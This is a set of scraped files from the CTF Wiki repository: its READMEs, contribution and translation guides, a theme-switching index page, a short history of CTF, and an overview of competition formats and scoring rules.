{"source": "github", "repo": "ctf-wiki/ctf-wiki", "file": ".github/PULL_REQUEST_TEMPLATE.md", "url": "https://github.com/ctf-wiki/ctf-wiki/blob/master/.github/PULL_REQUEST_TEMPLATE.md", "content": "Thanks for contributing to CTF Wiki!\n\n**Before submitting this pull request, please read**\n- [Contribute](https://ctf-wiki.org/contribute/before-contributing/)\n- [CTF Wiki's Wiki](https://github.com/ctf-wiki/ctf-wiki/wiki)\n\n**Please remove these message before PR.**\n", "timestamp": "2025-10-21T22:02:29.051366"}
{"source": "github", "repo": "ctf-wiki/ctf-wiki", "file": "README-zh_CN.md", "url": "https://github.com/ctf-wiki/ctf-wiki/blob/master/README-zh_CN.md", "content": "# CTF Wiki\n\n[![Discord](https://dcbadge.vercel.app/api/server/ekv7WDa9pq)](https://discord.gg/ekv7WDa9pq)\n\n[中文](./README-zh_CN.md)  [English](./README.md)\n\n欢迎来到 **CTF Wiki**。\n\n**CTF**（Capture The Flag，夺旗赛）起源于 1996 年 **DEFCON** 全球黑客大会，是网络安全爱好者之间的竞技游戏。\n\n**CTF** 竞赛涉及众多领域，内容繁杂。与此同时，安全技术的发展速度越来越快，**CTF** 题目的难度越来越高，初学者面对的门槛越来越高。而网上资料大都零散琐碎，初学者往往并不知道该如何系统性地学习 **CTF** 相关领域的知识，常需要花费大量时间，苦不堪言。\n\n为了使得热爱 **CTF** 的小伙伴们更好地入门 **CTF**，2016 年 10 月份，**CTF Wiki** 在 Github 有了第一次 commit。随着内容不断完善，**CTF Wiki** 受到了越来越多安全爱好者的喜爱，也渐渐有素未谋面的小伙伴们参与其中。 \n\n作为一个自由的站点，围绕 **CTF** 近几年赛题，**CTF Wiki** 对 **CTF** 中的各个方向的知识进行介绍，以便于初学者更好地学习 **CTF** 相关的知识。\n\n目前，**CTF Wiki** 主要包含 **CTF** 各大方向的基础知识，正在着力完善以下内容\n\n- CTF 竞赛中的进阶知识\n- CTF 竞赛中的优质题目\n\n关于上述部分待完善内容，请参见 CTF Wiki 的 [Projects](https://github.com/ctf-wiki/ctf-wiki/projects)，详细列举了正在做的事情以及待做事项。\n\n虽然 **CTF Wiki** 基于 **CTF**，却不会局限于 **CTF**。在未来，**CTF Wiki** 将会\n\n- 介绍安全研究中的工具\n- 更多地与安全实战结合\n\n此外，鉴于以下两点\n\n- 技术应该以开放的方式分享\n- 安全攻防技术在快速迭代更新，在面对新的防御技术时，旧的攻击技术随时可能失效\n\n因此，**CTF Wiki** 永远不会出版书籍。\n\n最后，**CTF Wiki** 源于社区，作为**独立的组织**，提倡**知识自由**，在未来也绝不会商业化，将始终保持**独立自由**的性质。\n\n## How to build？\n\n本文档目前采用 [mkdocs](https://github.com/mkdocs/mkdocs) 部署在 [https://ctf-wiki.org](https://ctf-wiki.org)。\n\n本项目可以直接部署在本地，具体方式如下：\n\n```shell\n# 1. clone\ngit clone https://github.com/ctf-wiki/ctf-wiki.git\n# 2. requirements\npip install -r requirements.txt\n# generate static file in site/\npython3 scripts/docs.py build-all\n# deploy at http://127.0.0.1:8008\npython3 scripts/docs.py serve\n```\n\n**mkdocs 本地部署的网站是动态更新的，即当你修改并保存 md 文件后，刷新页面就能随之动态更新。**\n\n\n你只是想本地浏览，并不想修改文档？试试 Docker 吧！\n\n```\ndocker run -d --name=ctf-wiki -p 4100:80 ctfwiki/ctf-wiki\n```\n随后即可在浏览器中访问 [http://localhost:4100/](http://localhost:4100/) 阅读 CTF Wiki 。\n\n## How to practice？\n\n首先，通过在线阅读来学习一些基本的安全知识。\n\n其次，CTF Wiki 还有两个姊妹项目\n\n- CTF Wiki 中涉及的题目在 [ctf-challenges](https://github.com/ctf-wiki/ctf-challenges) 仓库中，请根据对应的分类自行寻找。\n- CTF Wiki 中涉及的工具会不断补充到 [ctf-tools](https://github.com/ctf-wiki/ctf-tools) 仓库中。\n\n## How to make CTF Wiki Better？\n\n我们非常欢迎你为 Wiki 编写内容，将自己的所学所得与大家分享。我们期待着你的加入！\n\n**在你决定要贡献内容之前，请你务必看完 [CONTRIBUTING](https://ctf-wiki.org/en/contribute/before-contributing/)**。其中包含了详细的贡献方式。 \n\n非常感谢一起完善 CTF Wiki 的小伙伴们\n\n<a href=\"https://github.com/ctf-wiki/ctf-wiki/graphs/contributors\"><img src=\"https://contrib.rocks/image?repo=ctf-wiki/ctf-wiki\" /></a>\n\n## What can you get?\n\n- 快速学习新事物的能力\n- 不一样的思考方式\n- 乐于解决问题的心\n- 有趣的安全技术\n- 充实奋斗的时光\n\n在阅读 Wiki 之前，我们希望能给予你几点建议：\n\n- 学习 [提问的智慧](https://github.com/ryanhanwu/How-To-Ask-Questions-The-Smart-Way)\n- 善用 Google 搜索能帮助你更好地提升自己\n- 至少掌握一门编程语言，比如 Python\n- 动手实践比什么都要管用\n- 保持对技术的好奇与渴望并坚持下去\n\n> 世界很大，互联网让世界变小，真的黑客们应该去思考并创造，无论当下是在破坏还是在创造，记住，未来，那条主线是创造的就对了。 ——by 余弦\n\n安全圈很小，安全的海洋很深。安全之路的探险，不如就从 **CTF Wiki** 开始！\n\n## Copyleft\n<a rel=\"license\" href=\"http://creativecommons.org/licenses/by-nc-sa/4.0/\"><img alt=\"知识共享许可协议\" style=\"border-width:0\" src=\"https://i.creativecommons.org/l/by-nc-sa/4.0/88x31.png\" /></a><br />本作品采用<a rel=\"license\" href=\"http://creativecommons.org/licenses/by-nc-sa/4.0/\">知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议</a>进行许可。\n\n", "timestamp": "2025-10-21T22:02:31.003601"}
{"source": "github", "repo": "ctf-wiki/ctf-wiki", "file": "README.md", "url": "https://github.com/ctf-wiki/ctf-wiki/blob/master/README.md", "content": "# CTF Wiki\n\n[![Discord](https://dcbadge.vercel.app/api/server/ekv7WDa9pq)](https://discord.gg/ekv7WDa9pq)\n\n[中文](./README-zh_CN.md)  [English](./README.md)\n\nWelcome to **CTF Wiki**！\n\n**CTF** (Capture The Flag) started from **DEFCON CTF**, a competitive game among computer security enthusiasts, originally hosted in 1996.\n\n**CTF** covers a wide range of fields. Along with the evolving security technology, the difficulty of **CTF** challenges is getting harder and harder. As a result, the learning curve for beginners is getting steeper. Most online information is scattered and trivial. Beginners often don't know how to systematically learn **CTF**, which requires a lot of work and effort.\n\nIn order to let those people who are interested in **CTF**s start easily, in October 2016, **CTF Wiki** was established on Github. Along with gradually improved content over time, **CTF Wiki** has received lots of appreciation from security enthusiasts, many of those are guys that we think we would never meet.\n\nAs a freedom site, primarily focusing on recent CTFs, **CTF Wiki** introduces the knowledge and techniques in all aspects of **CTF** to make it easier for beginners to learn **CTF**.\n\nNow, **CTF Wiki** mainly contains the basic skills for **CTF**, but we are working hard to improve the following contents.\n\n- Advanced skills used in CTF\n- Special topics appearing in CTF\n\nFor the above-mentioned parts to be improved, please refer to [Projects](https://github.com/ctf-wiki/ctf-wiki/projects) which details what are planned.\n\nAlthough now **CTF Wiki** mainly focus **CTF**, it is not strictly limited to **CTF** topics. In the future, **CTF Wiki** will include\n\n- Tools used in security research\n- Increased discussion of security in the world\n\nIn addition, given the following two points\n\n- Information about technology should be openly shared.\n- As new techniques are always being developed, old techniques will start to fade over time and they should be replaced with new techniques.\n\nTherefore, **CTF Wiki** will never publish books.\n\nFinally, originating from the community, as an independent organization, **CTF Wiki** advocates **freedom of knowledge**, will **never be commercialized**, and will always maintain the character of **independence and freedom**.\n\n## How to build？\n\nCTF Wiki uses [mkdocs](https://github.com/mkdocs/mkdocs) to show its contents. And it is deployed at [https://ctf-wiki.org](https://ctf-wiki.org).\n\nIt can also be deployed locally, with the following steps:\n\n```shell\n# 1. clone\ngit clone https://github.com/ctf-wiki/ctf-wiki.git\n# 2. requirements\npip install -r requirements.txt\n# generate static file in site/\npython3 scripts/docs.py build-all\n# deploy at http://127.0.0.1:8008\npython3 scripts/docs.py serve\n```\n\n**A local instance of mkdocs is dynamically updated, for instance when a markdown file is modified, the corresponding page will be modified too.**\n\nIf you just want to view it statically, try Docker!\n\n```\ndocker run -d --name=ctf-wiki -p 4100:80 ctfwiki/ctf-wiki\n```\nAnd then access [http://localhost:4100/](http://localhost:4100/) .\n\n## How to practice？\n\nFirstly, learn some basic security knowledge through online reading.\n\nSecondly, CTF Wiki has two sister projects.\n\n- All of the challenges that are mentioned are in the [ctf-challenges](https://github.com/ctf-wiki/ctf-challenges) repository, you can locate them with their corresponding category.\n- The tools mentioned in the CTF Wiki are constantly added to the [ctf-tools](https://github.com/ctf-wiki/ctf-tools) repository.\n\n## How to make CTF Wiki Better？\n\nWe welcome to write content for the wiki and share what you have learned. \n\n**Before you decide to contribute content, please read [CONTRIBUTING](https://ctf-wiki.org/en/contribute/before-contributing/)**.\n\nThank you to all the people who have already contributed to CTF Wiki.\n\n<a href=\"https://github.com/ctf-wiki/ctf-wiki/graphs/contributors\"><img src=\"https://contrib.rocks/image?repo=ctf-wiki/ctf-wiki\" /></a>\n\n## What can you get?\n\n- Ability to learn new things quickly\n- Different ways of thinking\n- A love for solving problems\n- Interesting security techniques\n- Memorable and enriching experience\n\nBefore reading the Wiki, we hope to give you some advice:\n\n- Learn to ask [smart-questions](http://www.catb.org/~esr/faqs/smart-questions.html) .\n- Learn to use Google Search for self-improvement.\n- Be good at least one programming language, such as Python.\n- Practice is the most important learning tool.\n- Maintain the passions and desire to learn about new techniques.\n\nThe security circle is small and the areas of exploration is vast. Let's get started with **CTF Wiki**!\n", "timestamp": "2025-10-21T22:02:31.419539"}
{"source": "github", "repo": "ctf-wiki/ctf-wiki", "file": "docs/en/docs/contribute/basic-contribute-approach.md", "url": "https://github.com/ctf-wiki/ctf-wiki/blob/master/docs/en/docs/contribute/basic-contribute-approach.md", "content": "# Basic Contribute Approach\n\nIf you're familiar with contributing a Github Project, You can directly jump to next section. Otherwise, please take a look at https://akrabat.com/the-beginners-guide-to-contributing-to-a-github-project/.", "timestamp": "2025-10-21T22:02:32.580608"}
{"source": "github", "repo": "ctf-wiki/ctf-wiki", "file": "docs/en/docs/contribute/before-contributing.md", "url": "https://github.com/ctf-wiki/ctf-wiki/blob/master/docs/en/docs/contribute/before-contributing.md", "content": "# Before Contributing\n\nYou don't have to become a sophisticated CTFer before contributing to CTF Wiki. If you are enthusiastic about open source, and you enjoy sharing your piece of knowledge on CTF Wiki, please don't hesitate to join us.\n\nWhen you maintain CTF Wiki, no one will assign tasks to you. Feel free to commit when you find something imperfect.\n\nIf you find that somewhere is not well-written, you can discuss with the authors and make it a more reasonable structure.\n\n**Be sure to go over this guide before contributing.**\n", "timestamp": "2025-10-21T22:02:32.698297"}
{"source": "github", "repo": "ctf-wiki/ctf-wiki", "file": "docs/en/docs/contribute/documentation-requirement.md", "url": "https://github.com/ctf-wiki/ctf-wiki/blob/master/docs/en/docs/contribute/documentation-requirement.md", "content": "# Document Requirements\n\nWhen you intend to contribute something, you should assure\n\n- Content format\n- Content structure\n- File name and file path\n\nmeet the following requirements.\n\n## Content format\n\n!!! note \n    For the basic content format, it is needed to be discussed.\n\nSome other requirements\n\n- In the future, we may consider to automatically generate a sequence number for every paragraph title, so we recommend **no** sequence number for paragraph titles.\n- As the challenges mentioned in the doc are placed in the `ctf-challenge` repository in order, we don't need to include a link to the challenge in the documentation. Moreover, every time the challenge's location in the repository changes, the challenge link also changes. Therefore, fixing the challenge link is a time-consuming and annoying task.\n\n## Content structure\n\nThe content must have the following characteristics\n\n- From easy to hard, the difficulty of content should be gradual.\n- Logical, every part should contain the following items\n  - Principle, explaining the principle corresponding to this content.\n  - Examples, give 1 to 2 typical examples.\n  - Exercises, give 1 to 2 typical exercises.\n\n## File name and file path\n\nDocument should be stored in the appropriate directory.\n\n- Figure. Please note that the image should be placed in a local folder. We should avoid referencing image from other websites. We recommend using a relative path `./figure` to reference the image.\n- **File names must be lowercase, separated by `-`, e.g. `file-name`**.\n- Regardless of the example or the exercise, the corresponding attachments should be stored in the corresponding directory in the `ctf-challenge` repository.", "timestamp": "2025-10-21T22:02:32.802938"}
{"source": "github", "repo": "ctf-wiki/ctf-wiki", "file": "docs/en/docs/contribute/translation.md", "url": "https://github.com/ctf-wiki/ctf-wiki/blob/master/docs/en/docs/contribute/translation.md", "content": "# Translation\n\nCurrently, multi-language support mainly draws on the processing method of fastapi. It should be noted that during the translation process, we only need to ensure that the different languages ​​are consistent at the file level. Regarding the specific content of the document, you don't need to be too restrictive, just express the same meaning.\n\n## Improve existing language\n\nHere we take English as an example.\n\nFirst, we need to determine the two-letter code corresponding to English. By querying https://en.wikipedia.org/wiki/List_of_ISO_639-1_codes, we can know that the corresponding code is `en`.\n\nAfter confirming the code, we can know the directory where the documentation of the language is located, namely `docs/en`.\n\nSuppose the document we want to translate is `docs/zh/docs/contribute/translation.md`. Then, we can copy the file to `docs/en/docs/contribute/translation.md`. At the same time, if the file depends on figures, we also need to copy the corresponding figure folder to the corresponding directory.\n\nThen, we can open the Chinese corresponding mkdocs.yml, namely `docs/zh/docs/mkdocs.yml`, and find the location of the file we want to translate, such as\n\n```yaml hl_lines=\"8\"\nnav:\n- Start:\n  - index.md\n  - discussion.md\n  - contribute/before-contributing.md\n  - contribute/basic-contribute-approach.md\n  - contribute/documentation-requirement.md\n  - contribute/translation.md\n```\nThen we should add the corresponding file at the corresponding hierarchical structure in the English configuration file.\n\n```yaml hl_lines=\"8\"\nnav:\n- Start:\n  - index.md\n  - discussion.md\n  - contribute/before-contributing.md\n  - contribute/basic-contribute-approach.md\n  - contribute/documentation-requirement.md\n  - contribute/translation.md\n```\n\nThen, we can translate it.\n\nFinally, we can use `python3 scripts/doc.py live en` to preview the modified content.\n\n## Add New language\n\nIf you plan to add a language that has not yet undergone any translation, such as Japanese (`jp`), you can use\n\n```python\npython3 scripts/doc.py new-lang jp\n```\n\nTo initialize. After that, you can contribute as in the previous section.", "timestamp": "2025-10-21T22:02:32.913894"}
{"source": "github", "repo": "ctf-wiki/ctf-wiki", "file": "docs/en/docs/discussion.md", "url": "https://github.com/ctf-wiki/ctf-wiki/blob/master/docs/en/docs/discussion.md", "content": "# Discussion\n\nIf you have any question, feel free to choose [Github Discussion](https://github.com/ctf-wiki/ctf-wiki/discussions) or [![Discord](https://dcbadge.vercel.app/api/server/ekv7WDa9pq)](https://discord.gg/ekv7WDa9pq) to communicate with us.", "timestamp": "2025-10-21T22:02:33.025302"}
{"source": "github", "repo": "ctf-wiki/ctf-wiki", "file": "docs/en/docs/index.md", "url": "https://github.com/ctf-wiki/ctf-wiki/blob/master/docs/en/docs/index.md", "content": "# Introduction\n\n[![Discord](https://dcbadge.vercel.app/api/server/ekv7WDa9pq)](https://discord.gg/ekv7WDa9pq)\n\n\nWelcome to **CTF Wiki**！\n\n**CTF** (Capture The Flag) started from **DEFCON CTF**, a competitive game among computer security enthusiasts, originally hosted in 1996.\n\n**CTF** covers a wide range of fields. Along with the evolving security technology, the difficulty of **CTF** challenges is getting harder and harder. As a result, the learning curve for beginners is getting steeper. Most online information is scattered and trivial. Beginners often don't know how to systematically learn **CTF**, which requires a lot of work and effort.\n\nIn order to let those people who are interested in **CTF**s start easily, in October 2016, **CTF Wiki** was established on Github. Along with gradually improved content over time, **CTF Wiki** has received lots of appreciation from security enthusiasts, many of those are guys that we think we would never meet.\n\nAs a freedom site, primarily focusing on recent CTFs, **CTF Wiki** introduces the knowledge and techniques in all aspects of **CTF** to make it easier for beginners to learn **CTF**.\n\nNow, **CTF Wiki** mainly contains the basic skills for **CTF**, but we are working hard to improve the following contents.\n\n- Advanced skills used in CTF\n- Special topics appearing in CTF\n\nFor the above-mentioned parts to be improved, please refer to [Projects](https://github.com/ctf-wiki/ctf-wiki/projects) which details what are planned.\n\nAlthough now **CTF Wiki** mainly focus **CTF**, it is not strictly limited to **CTF** topics. In the future, **CTF Wiki** will include\n\n- Tools used in security research\n- Increased discussion of security in the world\n\nIn addition, given the following two points\n\n- Information about technology should be openly shared.\n- As new techniques are always being developed, old techniques will start to fade over time and they should be replaced with new techniques.\n\nTherefore, **CTF Wiki** will never publish books.\n\nFinally, originating from the community, as an independent organization, **CTF Wiki** advocates **freedom of knowledge**, will **never be commercialized**, and will always maintain the character of **independence and freedom**.\n\n## Material Color Palette Theme\n\n### Color Scheme\n\nThe light mode and dark mode automatically changes depends on yor browser or system settings, or you could manually change it.\n\n<div class=\"tx-switch\">\n<button data-md-color-scheme=\"default\"><code>Default</code></button>\n<button data-md-color-scheme=\"slate\"><code>Slate</code></button>\n</div>\n<script>\n  var buttons = document.querySelectorAll(\"button[data-md-color-scheme]\")\n  Array.prototype.forEach.call(buttons, function(button) {\n    button.addEventListener(\"click\", function() {\n      document.body.dataset.mdColorScheme = this.dataset.mdColorScheme;\n      localStorage.setItem(\"data-md-color-scheme\",this.dataset.mdColorScheme);\n    })\n  })\n</script>\n\n### Primary colors\n\nClick on the color block to change the main color of the theme.\n\n<div class=\"tx-switch\">\n<button data-md-color-primary=\"red\"><code>Red</code></button>\n<button data-md-color-primary=\"pink\"><code>Pink</code></button>\n<button data-md-color-primary=\"purple\"><code>Purple</code></button>\n<button data-md-color-primary=\"deep-purple\"><code>Deep Purple</code></button>\n<button data-md-color-primary=\"indigo\"><code>Indigo</code></button>\n<button data-md-color-primary=\"blue\"><code>Blue</code></button>\n<button data-md-color-primary=\"light-blue\"><code>Light Blue</code></button>\n<button data-md-color-primary=\"cyan\"><code>Cyan</code></button>\n<button data-md-color-primary=\"teal\"><code>Teal</code></button>\n<button data-md-color-primary=\"green\"><code>Green</code></button>\n<button data-md-color-primary=\"light-green\"><code>Light Green</code></button>\n<button data-md-color-primary=\"lime\"><code>Lime</code></button>\n<button data-md-color-primary=\"yellow\"><code>Yellow</code></button>\n<button data-md-color-primary=\"amber\"><code>Amber</code></button>\n<button data-md-color-primary=\"orange\"><code>Orange</code></button>\n<button data-md-color-primary=\"deep-orange\"><code>Deep Orange</code></button>\n<button data-md-color-primary=\"brown\"><code>Brown</code></button>\n<button data-md-color-primary=\"grey\"><code>Grey</code></button>\n<button data-md-color-primary=\"blue-grey\"><code>Blue Grey</code></button>\n<button data-md-color-primary=\"white\"><code>White</code></button>\n</div>\n<script>\n  var buttons = document.querySelectorAll(\"button[data-md-color-primary]\");\n  Array.prototype.forEach.call(buttons, function(button) {\n    button.addEventListener(\"click\", function() {\n      document.body.dataset.mdColorPrimary = this.dataset.mdColorPrimary;\n      localStorage.setItem(\"data-md-color-primary\",this.dataset.mdColorPrimary);\n    })\n  })\n</script>\n\n### Accent colors\n\nClick on the color block to change the auxiliary color of the theme.\n\n<div class=\"tx-switch\">\n<button data-md-color-accent=\"red\"><code>Red</code></button>\n<button data-md-color-accent=\"pink\"><code>Pink</code></button>\n<button data-md-color-accent=\"purple\"><code>Purple</code></button>\n<button data-md-color-accent=\"deep-purple\"><code>Deep Purple</code></button>\n<button data-md-color-accent=\"indigo\"><code>Indigo</code></button>\n<button data-md-color-accent=\"blue\"><code>Blue</code></button>\n<button data-md-color-accent=\"light-blue\"><code>Light Blue</code></button>\n<button data-md-color-accent=\"cyan\"><code>Cyan</code></button>\n<button data-md-color-accent=\"teal\"><code>Teal</code></button>\n<button data-md-color-accent=\"green\"><code>Green</code></button>\n<button data-md-color-accent=\"light-green\"><code>Light Green</code></button>\n<button data-md-color-accent=\"lime\"><code>Lime</code></button>\n<button data-md-color-accent=\"yellow\"><code>Yellow</code></button>\n<button data-md-color-accent=\"amber\"><code>Amber</code></button>\n<button data-md-color-accent=\"orange\"><code>Orange</code></button>\n<button data-md-color-accent=\"deep-orange\"><code>Deep Orange</code></button>\n</div>\n<script>\n  var buttons = document.querySelectorAll(\"button[data-md-color-accent]\");\n  Array.prototype.forEach.call(buttons, function(button) {\n    button.addEventListener(\"click\", function() {\n      document.body.dataset.mdColorAccent = this.dataset.mdColorAccent;\n      localStorage.setItem(\"data-md-color-accent\",this.dataset.mdColorAccent);\n    })\n  })\n</script>\n\n<style>\nbutton[data-md-color-accent]> code {\n    background-color: var(--md-code-bg-color);\n    color: var(--md-accent-fg-color);\n  }\nbutton[data-md-color-primary] > code {\n    background-color: var(--md-code-bg-color);\n    color: var(--md-primary-fg-color);\n  }\nbutton[data-md-color-primary='white'] > code {\n    background-color: var(--md-primary-bg-color);\n    color: var(--md-primary-fg-color);\n  }\nbutton[data-md-color-accent],button[data-md-color-primary],button[data-md-color-scheme]{\n    width: 8.4rem;\n    margin-bottom: .4rem;\n    padding: 2.4rem .4rem .4rem;\n    transition: background-color .25s,opacity .25s;\n    border-radius: .2rem;\n    color: #fff;\n    font-size: .8rem;\n    text-align: left;\n    cursor: pointer;\n}\nbutton[data-md-color-accent]{\n  background-color: var(--md-accent-fg-color);\n}\nbutton[data-md-color-primary]{\n  background-color: var(--md-primary-fg-color);\n}\nbutton[data-md-color-scheme='default']{\n  background-color: hsla(0, 0%, 100%, 1);\n}\nbutton[data-md-color-scheme='slate']{\n  background-color: var(--md-default-bg-color);\n}\nbutton[data-md-color-accent]:hover, button[data-md-color-primary]:hover {\n    opacity: .75;\n}\n</style>", "timestamp": "2025-10-21T22:02:33.140104"}
{"source": "github", "repo": "ctf-wiki/ctf-wiki", "file": "docs/en/docs/introduction/history.md", "url": "https://github.com/ctf-wiki/ctf-wiki/blob/master/docs/en/docs/introduction/history.md", "content": "# History of CTF Wiki\n\n> This section's contenth refers to Dr. Jianwei Zhuge's presentation \"The Past, Present and Future of CTF\" released on [i春秋](https://www.ichunqiu.com/).\n\n## Origin of CTF\n\nCTF (i.e. `Capture The Flag`) starts from the forth DEFON in 1996, which is an alternative of real-world cyber-attack competition games between legacy hackers, and has now become the most popular type of cyber-security competition all around the world.\n\n## Early Years of CTF\n\nAt the time when CTF competitions are at the beginning stage (1996-2001), there were no clear rules, no professionally built platform or environment. Each team need to prepare their own objective (defending their own objective, while attacking opponents' objective). Most of the organizers are just enthusiastic non-professional volunteers who assist in manual scoring.\n\nDue to the lack of an automated scoring system and technical competence among judges, many scoring delays and errors, unreliable network, and improper configuration, such approaches have caused great controversy and dissatisfaction at the time.\n\n## \"Modern\" CTF Competition\n\nA modern CTF competition should be held by professional organizers who will manage the competition platform, create challenges, and implement competitions with an automated scoring system.\n\nDuring the three years with LegitBS organizing the DEFCON CTF competition, a few modifications have been made:\n\n- The competition focuses on the inner workings of the computers, its security features and capabilities. Web exploitation has been completely ignored.\n- Various CPU architectures, operating systems, and languages.\n- The \"Zero-Sum\" scoring rule.\n- A wider skillset required: reverse engineering, vulnerability discovery, pwning, patching, network traffic analysis, system security, programming and debugging.", "timestamp": "2025-10-21T22:02:33.589052"}
{"source": "github", "repo": "ctf-wiki/ctf-wiki", "file": "docs/en/docs/introduction/mode.md", "url": "https://github.com/ctf-wiki/ctf-wiki/blob/master/docs/en/docs/introduction/mode.md", "content": "# CTF Competition Types\n\n## Jeopardy: Problem Solving\n\nThe problem-solving (Jeopardy) is a common format in online CTF competitions. In a Jeopardy CTF, the participating teams can participate through the Internet or the on-site network. Furthermore, teams can use the online environment to communicate and share files, solve technical challenges, and submit the answers to score points.\n\nGenerally in a Jeopardy CTF the first three teams that solve a challenge will be rewarded with extra points. Typically, the first three solves are called the **first blood** , **second blood**, and the **third blood**. This scoring format not only rewards teams who can solve the challenge quickly, but also shows teamwork through collaboration.\n\nBesides that, there's also another popular rule focusing on \"decreasing participants' points\", which means to set a original point for a challenge at the start, and gradually get it lower according to the number of teams who have solved it. The point of a challenge will keep being decreased as more teams have successfully solved it, and stops at a lowest point and finally keep unchanged.\n\nCurrently, there are six main categories in CTF:\n\n- **Web – Web Application Exploitation**\n- **RE - Reverse Engineering**\n- **Pwn - Binary Exploitation**\n- **Crypto - Cryptography Security**\n- **Mobile - Mobile Security**\n- **Misc - Miscellaneous**\n\n## Belluminar: War Sharing\n\nBelluminar mode was developed by POC SECURITY from South Korea, and was introduced into China since World Hacking Masters Challenge (WCTF) in 2016.\n\nYou can refer to Belluminar's official website for more information: <http://belluminar.org/> .\n\n### Introduction to the Belluminar System\n\nHere's the introduction from Belluminar's official website:\n\n> Belluminar, hacking contest of POC, started at POC2015 in KOREA for the first time. Belluminar is from 'Bellum'(war in Latin) and 'seminar'. It is not a just hacking contest but a kind of\n> festival consisted of CTF & seminar for the solution about challenges. Only invited teams can join Belluminar. Each team can show its ability to attack what other teams want to protect and can\n> defend what others want to attack.\n\n### Stage of Making the Challenges\n\nFirst, each invited team must submit two challenges before the official competition. The teams will have 12 weeks to prepare their challenges. The score of making challenges accounted for 30% of the total team score.\n\n> Challenge 1: must be on the Linux platform;\n>\n> Challenge 2: No platform restriction(except Linux) No challenge type restriction (Pwn, Reverse...)\n\nTraditional Belluminar systems require each team to make two challenges. One of the challenges must be in Linux, while the other has no platform(except Linux) or challenge type restriction. Therefore, teams can show their skill and creativity.\n\nIn order to make the types of challenges more balanced, teams have to draw for their challenge type. This requires the team's skill level to be more comprehensive. In order to maintain balance, the two challenges might have different scores (For example, one might need to be the score of 200, while the other be the score of 100).\n\n### Submitting and Deploying Challenges\n\nBefore the deadline of challenge submitting , each team must submit a full document and a solve writeup of the challenges. The document must contain the challenge name, score, description, creator, knowledge needed, and source code of the challenge. However, the solve write-up only needs to include the operating environment, full solving process, and solve script/code.\n\nAfter the challenges have been submitted, the organizers will test the challenges and code. If issues were found, the person responsible for the challenge must help to solve the problems. Then, the challenges can be put on the competition platform.\n\n### During the Competition\n\nAfter entering the competition, each team can request to solve other teams' challenges. Typically there's no First Blood reward here. The ranking is based on the accumulated points earned by solving the challenges; points earned from challenges account for 60% of the overall points.\n\n### Discussion After the Competition\n\nAfter the game is over, each team need to prepare slides for their own challenges. During the sharing meeting, each team needs to have two members to share their intended solutions, learning process, knowledge points, etc. Once the presentative is over, open discussion begins. The two team representatives must answer questions from other players or judges. While they don’t have a time limit on answering questions, however, the time used is a variable in the scoring process.\n\n### Scoring Rules\n\nScores from creating challenges (30% of overall score) – 50% of the points are based on the level of details, completion, submit time, and the other 50% of the points coms from solved challenges. The formula is as follows: Score = MaxScore -- | N -- Expect＿N | N is the number of teams that solved this challenge. Expect＿N is the number of teams expected to solve this challenge. Only when the challenge’s difficulty is balanced, the number of teams solved this challenge will be closer to the number of teams expected to solve this challenge, the challenge’s creator will earn more points.\n\nScore from solving challenges (60% of overall score) – First Blood is not included in the calculation.\n\nScore from sharing – (10% of overall score) – Scores based on the content during the sharing meeting voted by players and judges (account for the time taken and other restrictions), will be calculated as an average.\n\n### Thoughts on the Belluminar System\n\nThe Belluminar system handed over the responsibility of creating challenges to the invited teams, where each team do their best to create challenges for each other. The difficulty and scope of the competition will not be restricted by the organizer, so the quality of the challenges will improve. The “Sharing” phase allows each team to explain their challenges. The open discussion process enables the sharing of creative ideas/methods. The “Sharing” phase after the competition is a great way for others players to learn.\n\n## Attack and Defense Mode - Attack & Defense\n\n### Overview\n\nThe Attack and Defense competitions are usually done offline, especially the final stages of some huge CTF competitions. In Attack and Defense mode, each team will have the same copy of a specific system environment, often referred to as the “Gamebox”. On the attacking side, teams need to discover vulnerabilities on services running on the opponent’s machine, then exploit them to score by obtaining the flag. On the defending side, teams need to patch existing vulnerabilities to stop losing points (usually defending and patching are the only way to stop losing points, of course, in some competitions successful defending can be rewarded with points).\n\nAn Attack and Defend competition not only tests the team’s technical skills but also tests the players' body (since most competitions last about 48 hours). At the same time, team members need to split up the tasks and work together on solving different problems.\n\nUsually, the competition organizer will disclose the details on the requirements 30 minutes or 1 day before the competition. During that time, you cannot attack. You need to get familiar with the given environment and prepare to defend based on the given requirements. You will need to discover the opponent Gamebox’s IP address using the given subnet.\n\nIf the two Attack and Defend sessions are between morning and afternoon, then the vulnerable services will get changed (in case players talk about them during the break). However, the IP address and what will not change.\n\nNormally, the organizer will provide ethernet cables, but not ethernet adopters.\n\n### Basic Rules\n\nThe general rules of attack and defense mode are as follows:\n\n- The teams will start with same points.\n- During each round, the organizer will update which service contains the released flag.\n- During each round, if a team’s vulnerable service and the attacker obtained the flag via the vulnerable service, then the team will lose some points and the attacker will gain some points.\n- During each round, if a team can keep the its services running normally, then that team won’t lose points. (if defended successful, the points will be rewarded)\n- If a team’s service goes down, then the team will lose points, which distributed to teams that had their service running normally. Often, service downtime and errors will result in more deduction of points.\n- If all teams’ service goes down during a round and it is determined to be unavoidable. Then, no points will be deducted.\n- During each round, if a service goes down and a team gets the flag, the team responsible for the service may get deduct double the points.\n- The uses of general defense methods are forbidden. The participating teams should backup all services before the competition. If a service gets lost or damaged, the organizer will not restore it.\n- It is forbidden to attack the competition platform, including but not limited obtaining root in Gameebox. The offender immediately banned from the competing.\n- If the team finds violations of other teams, please report them immediately and we will strictly review and make corresponding judgments.\n\n### Network Environment\n\nThe document will usually contain a network topology map (as shown below). Each team will maintain some Gamebox (one’s own server), vulnerable services are deployed on the Gamebox.\n\n![network](./figure/network.jpg)\n\nThe document will include the area of the players, the attack and defense zone, and the organizer’s or third party’s environment.\n\nPlayers environment includes (players need to configure or use DHCP to obtain the following configuration):\n\n- IP address\n- Gateway\n- Subnet\n- DNS server address\n\nAttack and defense environment includes:\n\n- The IP addresses of their own and the other teams' Gamebox.\n- The competition usually provides a table of team ids with their corresponding IP address to make planning easier.\n\nOrganizer environment includes:\n\n- Competition platform\n- Submit flag portal\n- Traffic dashboard\n\n### Accessing Gamebox\n\nThe document provides the login details. Normally, it's like the following:\n\n- Username is `ctf`.\n- Login to SSH using a password or private key.\n\n> Tips: Default passwords should be changed immediately and weak passwords should not be used.", "timestamp": "2025-10-21T22:02:33.698730"}
